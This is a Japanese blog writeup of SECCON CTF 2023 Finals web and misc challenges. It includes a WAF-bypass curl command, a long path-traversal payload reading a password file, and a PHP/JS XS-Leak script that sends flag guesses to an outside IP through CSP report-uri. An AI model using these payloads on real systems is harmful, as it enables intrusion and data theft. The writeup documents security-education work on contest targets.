@@ -1,0 +1,93 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D}</style><title>SECCON CTF 2023 Finals Writeup</title><meta name=description content><meta name=keywords content><meta property="og:url" content="https://blog.tyage.net/post/2023/2023-12-28-seccon/"><meta property="og:type" content="website"><meta property="og:title" content="SECCON CTF 2023 Finals Writeup"><meta property="og:description" content><meta property="og:image" content="https://blog.tyage.net/icon/icon.jpg"><meta property="og:image:secure_url" content="https://blog.tyage.net/icon/icon.jpg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="SECCON CTF 2023 Finals Writeup"><meta name=twitter:description content><meta property="twitter:domain" content="https://blog.tyage.net/post/2023/2023-12-28-seccon/"><meta property="twitter:url" content="https://blog.tyage.net/post/2023/2023-12-28-seccon/"><meta name=twitter:image content="https://blog.tyage.net/icon/icon.jpg"><link rel=canonical href=https://blog.tyage.net/post/2023/2023-12-28-seccon/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.edd985581bf860dfb4507e5885197f1680160c7fe19f23b31e183126d99dd596.js integrity="sha256-7dmFWBv4YN+0UH5YhRl/FoAWDH/hnyOzHhgxJtmd1ZY="></script>
+<link rel=alternate type=application/activity+json href=https://fed.brid.gy/r/https://blog.tyage.net/post/2023/2023-12-28-seccon/><link rel=webmention href=https://webmention.io/blog.tyage.net/webmention><link rel=pingback href=https://webmention.io/blog.tyage.net/xmlrpc><link rel=stylesheet type=text/css href=/css/style.css><script src=/js/redirect.js></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-C64TPJYY96"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-C64TPJYY96")</script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1507795450221855" crossorigin=anonymous></script></head><body><script type=text/javascript>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://blog.tyage.net><img src=https://blog.tyage.net/icon/icon.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://blog.tyage.net>blog.tyage.net</a></div><div class=nav-links><div class=nav-link><a href=https://blog.tyage.net/post><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://blog.tyage.net/index.xml><span data-feather=rss></span> RSS</a></div><div class=nav-link><a href=https://tyage.net><span data-feather=home></span> About me</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span id=dark-theme-toggle-screen-reader-target class=sr-only></span>
+<a><span id=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span id=hamburger-menu-toggle-screen-reader-target class=sr-only>menu</span>
+<a><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://blog.tyage.net/post><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://blog.tyage.net/index.xml><span data-feather=rss></span> RSS</a></li><li class=nav-item><a href=https://tyage.net><span data-feather=home></span> About me</a></li><li class="nav-item dark-theme-toggle"><span id=dark-theme-toggle-screen-reader-target class=sr-only>theme</span>
+<a><span id=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container h-entry"><div class=post-header-section><h1 class=p-name>SECCON CTF 2023 Finals Writeup</h1><small role=doc-subtitle></small><p class=post-date>2023/12/28 23:35:07</p><ul class=post-tags></ul></div><div class=post-content><div class=e-content><p>チーム「ierae」でSECCON CTF 2023 Finals (International)に参加していた。</p><p>結果としては10位くらいだったけど、1問解けば4位くらいまで上がれるくらい団子状態だった気がする。</p><h2 id=web-babywaf>Web babywaf</h2><p>baby問なのになかなかsolveが出なくてウケた。</p><p><code>fastify/http-proxy</code>のproxyがありWAFになっており、特定のJSON propertyが設定されていると弾かれる。
+backendのexpressにどうやってJSONを届けるかという問題。</p><p>proxy側はJSONとして処理されず、expressではただしいJSONとして処理されればいいので、いい感じのヘッダやRequest Smugglingっぽいことはできないかと試行錯誤して時間を潰した。</p><p><code>Content-Encoding: gzip</code> はproxyがJSONとして処理できずに、backendではJSONになるのでこれが使えそうと気づく。
+しかし、proxy側で受け取ったrequest bodyをUTF-8 decodeしてしまうのでうまくいかない。</p><p>↓はうまくいかない。ちなみに、proxy側がrequest body書き換えてしまって<code>content-length</code>との不整合が起きるので<code>transfer-encoding: chunked</code>する工夫をしている。結果的には無意味であったが&mldr;</p><pre tabindex=0><code>$ echo &#39;{&#34;givemeflag&#34;: &#34;json&#34;}&#39; | gzip | curl -v -i --data-binary @- -H &#34;Content-Encoding: gzip&#34;  http://babywaf.int.seccon.games:3000 -H&#39;content-type: text/plain&#39; -H &#39;transfer-encoding: chunked&#39;
+</code></pre><p>ASCII範囲のgzipやdeflateを送る必要があるんだけど、なんかあったっけ〜と呟いていたらチームのshiho氏から <a href=https://github.com/molnarg/ascii-zip>https://github.com/molnarg/ascii-zip</a> を教えてもらう。
+自分も昔CTFで使ったはずなのになかなか記憶に出てこなかった（あと、なんかあった気はしたのでググっていたけどググり力が低く見つけられなかった）</p><p>一応、ascii-zipそのまま使うだけでは駄目で、checksumやmagic headerもASCII範囲内に収まるように少し改造した。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>diff --git a/compress.py b/compress.py
+</span></span><span style=display:flex><span>index 7157045..72c7084 100755
+</span></span><span style=display:flex><span><span style=color:#f92672>--- a/compress.py
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/compress.py
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -523,7 +523,7 @@ def wrap_gzip(compressed):
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span> def wrap_zlib(compressed, data):
+</span></span><span style=display:flex><span>     return (
+</span></span><span style=display:flex><span><span style=color:#f92672>-        &#39;x\xda&#39; +
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+        &#39;x\x01&#39; +
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>         compressed +
+</span></span><span style=display:flex><span>         struct.pack(&#39;!L&#39;, zlib.adler32(data) % pow(2, 32))
+</span></span><span style=display:flex><span>     )
+</span></span><span style=display:flex><span><span style=color:#75715e>@@ -537,9 +537,25 @@ elif args.mode == &#39;gzip&#39;:
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     output.write(wrap_gzip(compressor.compress(data)[0]))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> elif args.mode == &#39;zlib&#39;:
+</span></span><span style=display:flex><span><span style=color:#f92672>-    compressed, data = compressor.compress(data)
+</span></span></span><span style=display:flex><span><span style=color:#f92672>-    print repr(compressed)
+</span></span></span><span style=display:flex><span><span style=color:#f92672>-    output.write(wrap_zlib(compressed, data))
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+    i = 0
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+    while True:
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        compressor = ASCIICompressor(
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+            map(chr, range(1, 128))
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        )
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        i = i + 1
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        data = &#39;{&#34;givemeflag&#34;:&#34;&#39;+str(i)+&#39;&#34;}&#39;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        compressed, data = compressor.compress(data)
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        #print repr(compressed)
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        data = wrap_zlib(compressed, data)
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        print(data)
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        fail = False
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        for j in data:
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+            if ord(j) &gt; 127:
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+                print(ord(j))
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+                fail = True
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+        if fail == False:
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+            output.write(data)
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+            break
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>
+</span></span><span style=display:flex><span> elif args.mode == &#39;swf&#39;:
+</span></span><span style=display:flex><span>     body = data[8:]
+</span></span></code></pre></div><p>これで出力したpayloadを<code>Content-Encoding: deflate</code>付きで送るといける。</p><p>想定解はUTF-8のBOM付きJSONを送るだけ。
+<code>fastify/http-proxy</code>のソースコードを追っていくと<code>secure-json-parse</code>によって処理されるが、そこでUTF-8のBOMの処理があるので気づいた人が多いっぽい。
+自分も気づいたものの、proxy側なので使えないと思い試さなかった。</p><p>FLAG: <code>SECCON{**MAY**_in_rfc8259_8.1}</code></p><h2 id=web-plainblog>Web plainblog</h2><p>前半は以下のようなpathを設定する問題。後半は<code>os.path.realpath</code>を使った似たような問題。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>open(os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>abspath(os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>normpath(path))) <span style=color:#75715e># これは読めるが、</span>
+</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>normpath(path)) <span style=color:#75715e># これは False になる</span>
+</span></span></code></pre></div><p>Race Conditionがあるのかな〜とか、1ヶ月前に出たCVE-2023-40587が関係あるのかな〜とか、Pythonのコードを読んでいたが分からんとなった。
+しかしなんかこの問題見覚えがある気がする&mldr;と思い、後半で出てくる<code>os.path.realpath</code>を入れてググるとGoogle CTF 2022のLEGITのwriteupが出てきた。</p><blockquote><p>Typically Linux has a maximum filename length of 255 characters, and paths that are passed to syscalls can&rsquo;t exceed 4095 characters (reference).
+<a href=https://ctftime.org/writeup/34547>https://ctftime.org/writeup/34547</a></p></blockquote><p>これじゃん。</p><p>os.path.existsのほうでは4096バイトを超えるようにすればいいので、以下のようなpayloadを送って解いた。</p><pre tabindex=0><code>page=.////../../../../page//..//..//..//..//..//(...たくさん...)//..//..//..//..//..//..//..//proc/self/root/app/password
+</code></pre><p>FLAG: <code>SECCON{play_with_path_mechanics}</code></p><h2 id=web-cgi-2023>Web CGI 2023</h2><p>ヘッダインジェクションできるが、<code>Content-Security-Policy: default-src 'none'</code>が設定されているのでどうする？という問題。
+XSSでなくともresponse bodyのXS-Leakができればいい。</p><p>まず思いつくのは <a href=https://twitter.com/ankursundara/status/1723410507389129092>https://twitter.com/ankursundara/status/1723410507389129092</a> の<code>Content-Type: multipart/x-mixed-replace</code>だが、ブラウザがFirefoxではないので使えない。</p><p><code>Access-Control-Allow-Credentials</code>ヘッダやXSSIを使ってデータを抜き取ろうとするも、SameSite以前に以下のエラーが出るせいで外部から読み取れない。
+今回の環境ではブラウザから見てwebサーバがprivate IP addressにあるので、secure contextにないクライアントからはwebサーバのリソースにアクセスできない。
+secure contextにいたらいたで、webサーバがhttpなのでmixed contentで怒られる。詰み。</p><pre tabindex=0><code>The request client is not a secure context and the resource is in more-private address space `private`.
+</code></pre><p>Response Splittingも試したがうまくいかない。
+<code>Content-Security-Policy-Report-Only</code>を設定して、HTMLの先頭に <code>&lt;img src=http://exmaple.com/</code> を突っ込み、URLがレポートされないか試したりもしたが、ちゃんとタグが閉じられないとダメ。</p><p>色々試しているうちに、そういえばresponse bodyのXS-Leakだから、response bodyのhashがわかればいいんだよなと気づく。</p><p><code>Content-Security-Policy-Report-Only: style-src 'sha256-xxxx...'</code>を設定して、HTMLの先頭に <code>&lt;style></code> を突っ込めば<code>&lt;style></code>の中身がそのsha256にマッチするかどうかでleakできる。</p><pre tabindex=0><code>&lt;script&gt;
+const sleep = (time) =&gt; new Promise(res =&gt; setTimeout(res, time));
+const main = async () =&gt; {
+&lt;?php
+//$prefix = &#34;leaky_sr&#34;;
+$prefix = $_GET[&#34;prefix&#34;];
+$chars = &#34;._-}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;;
+file_put_contents(&#34;chars.txt&#34;, $chars);
+foreach (str_split($chars) as $char) {
+  $flag = &#34;Status: 200 OK\nContent-Type: text/plain; charset=utf-8\n\nSECCON{&#34; . $prefix . $char;
+  $length = 74 + strlen($prefix);
+  $hash = base64_encode(hash(&#39;sha256&#39;, $flag, true));
+  $q = &#34;Content-Type: text/html\r\nContent-Security-Policy-Report-Only: style-src &#39;sha256-$hash&#39;; report-uri http://35.194.96.69:12345/record.php?k=$char\r\nContent-Length: $length\r\n\r\n&lt;style&gt;&#34;;
+?&gt;
+a = window.open(&#39;http://web:3000/?q=&lt;?php echo urlencode($q) ?&gt;&#39;, &#39;&#39;, &#39;width=100,height=100&#39;);
+await sleep(100);
+a.close()
+&lt;?php } ?&gt;
+location = &#34;/redirect.php?prefix=&lt;?php echo $prefix; ?&gt;&#34;;
+}
+main();
+&lt;/script&gt;
+</code></pre><p>FLAG: <code>SECCON{leaky_sri}</code></p><h2 id=misc-digicake>Misc digicake</h2><p>1チーム20分が与えられ、順番に部屋に案内されるのでその間に解くやつ。</p><p>電気回路の基盤を渡されて、配線をゴリゴリ削りながら爆弾を解除する問題。</p><p>自分のチームはコンテスト開始から2時間後くらいの枠でチャレンジすることになっていたのだけど、チームで1番詳しそうな人が電工二種の試験でその時間は不在だし試験中なので当然連絡取れない。
+そんな偶然ある？</p><p>大学とか高校の知識を思い出したりしながら、メンバー全員で取り組んだ。
+グラウンドにつながる配線切ればいいんじゃない？というアイデアを出したりして、少しは貢献できた気がする。</p><p>全チームでFirst blood。まあ最初のほうの枠だったので。</p><p>楽しかった。</p><p>FLAG: SECCON{How_many_solutions_did_you_find?}</p><h2 id=misc-whitespacejs>Misc whitespace.js</h2><p>JSパズル問なのに解けなかった&mldr;くやし〜</p><p>予選で出たnode-ppjailの延長だと思い、node.jsのソースコードからいい感じのガジェットがないかな〜とsemgrepかけたりソースコード見ながらdebuggerでポチポチしたりしていたら頭がおかしくなってタイムアップ。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>b</span>[<span style=color:#e6db74>&#34;polluted1&#34;</span>]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>a</span>(<span style=color:#a6e22e>polluted2</span>)()
+</span></span></code></pre></div><p>evalの返り値がconsole.logされるし、console.logのformatter周りがよさそうと思い見ていたが、脳みそが足りなかった。</p><p>他には <code>prototype.env</code> とか <code>prototype.NODE_OPTIONS</code> を汚染しておいて、child_process.spawnが呼ばれればRCEできるので、そういった方法もないかも探っていた。</p><p>想定解的にはnode.js internalへの攻撃は不要だった&mldr;</p><p>大学生くらいのときなら解けてた気がする</p></div></div><div><script src=/js/webmention.min.js data-max-webmentions=60 async></script><div id=webmentions></div></div><div class=prev-next><div class=prev-post><p><a href=/post/2023/2023-12-28-hotel-2023/>&#8592;
+Previous:
+2023年宿泊した宿</a></p><p class=prev-post-date>December 28, 2023</p></div></div><div style=display:none><a class=u-bridgy-fed href=https://fed.brid.gy/></a><p class=dt-published>2023-12-28T23:35:07+09:00</p></div></div></main><footer class=footer><span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/526avijitgupta/gokarna>Gokarna</a></span></footer></body></html>
